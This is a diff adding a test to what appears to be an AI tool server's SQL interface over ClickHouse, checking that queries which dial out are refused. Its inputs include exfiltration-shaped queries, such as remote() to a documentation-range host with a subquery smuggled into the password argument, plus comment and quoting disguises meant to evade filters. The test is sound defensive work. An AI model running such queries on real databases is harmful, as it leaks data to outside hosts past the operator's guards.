@@ -214,6 +214,50 @@ async function test(name, fn) {
       assert.ok(/readonly/i.test(r.result.content[0].text), `server refusal passed through: ${r.result.content[0].text.slice(0, 120)}`);
     });
 
+    await test('sql: a query that would dial OFF this server is refused by memhouse, before it dials', async () => {
+      // First, prove the guard is load-bearing rather than decorative: this credential
+      // may run remote(), and ClickHouse answers it. (A real member holds the same
+      // reach — `memhouse relocate` needs `GRANT REMOTE ON *.*`, so invite and install
+      // grant it, and the server stopped being the thing that refuses this.)
+      const direct = await chq(`SELECT dummy FROM remote('127.0.0.1:9000', 'system', 'one', 'default', '${PASS}')`, { db: 'mem' });
+      assert.strictEqual(direct.trim(), '0', 'the server itself would run remote() for this credential');
+
+      // 192.0.2.7 is TEST-NET-1 (RFC 5737) — nothing answers. A query that actually
+      // left would hang until ClickHouse's own 519 timeout, so a fast refusal naming
+      // the function is proof it never went. The password argument folds a subquery,
+      // which is how a value leaves in the handshake; that is the shape refused here.
+      const t0 = Date.now();
+      const r = await s.rpc('tools/call', { name: 'sql', arguments: {
+        query: "SELECT * FROM remote('192.0.2.7:9000', 'system', 'one', 'u', (SELECT 'stolen'))",
+      }, _meta: MODERN_META });
+      const ms = Date.now() - t0;
+      assert.strictEqual(r.result.isError, true);
+      const text = r.result.content[0].text;
+      assert.ok(text.includes('remote()'), `names the function: ${text.slice(0, 140)}`);
+      assert.ok(!/timeout|NetException|519/i.test(text), `refused by memhouse, not by the network: ${text.slice(0, 140)}`);
+      assert.ok(ms < 3000, `refused without dialing (${ms}ms)`);
+
+      // Same for the disguises the normalisation exists for, and for DESCRIBE's
+      // schema inference, which dials out with no FROM clause at all.
+      for (const q of [
+        "SELECT * FROM /* ' */ remote('192.0.2.7:9000', 'system', 'one')",
+        "SELECT * FROM \"remote\"('192.0.2.7:9000', 'system', 'one')",
+        "SELECT * FROM numbers(1) WHERE 1 IN (SELECT * FROM remote('192.0.2.7:9000', 'system', 'one'))",
+        "DESCRIBE url('http://192.0.2.7/x')",
+        "SELECT * FROM url('http://192.0.2.7/x', 'LineAsString')",
+      ]) {
+        const rr = await s.rpc('tools/call', { name: 'sql', arguments: { query: q }, _meta: MODERN_META });
+        assert.strictEqual(rr.result.isError, true, `refused: ${q}`);
+        assert.ok(/refused here/.test(rr.result.content[0].text), `memhouse's own refusal: ${q}`);
+      }
+
+      // And the house still reads — the guard costs the tool nothing it is for.
+      const out = parseTool(await s.rpc('tools/call', { name: 'sql', arguments: {
+        query: 'SELECT count() AS n FROM messages',
+      }, _meta: MODERN_META }));
+      assert.strictEqual(Number(out.rows[0].n), 6);
+    });
+
     await test('the credential appears in no frame the server ever emitted', async () => {
       assert.ok(s.rawFrames.length > 8);
       for (const f of s.rawFrames) assert.ok(!f.includes(PASS), 'password leaked into a frame');
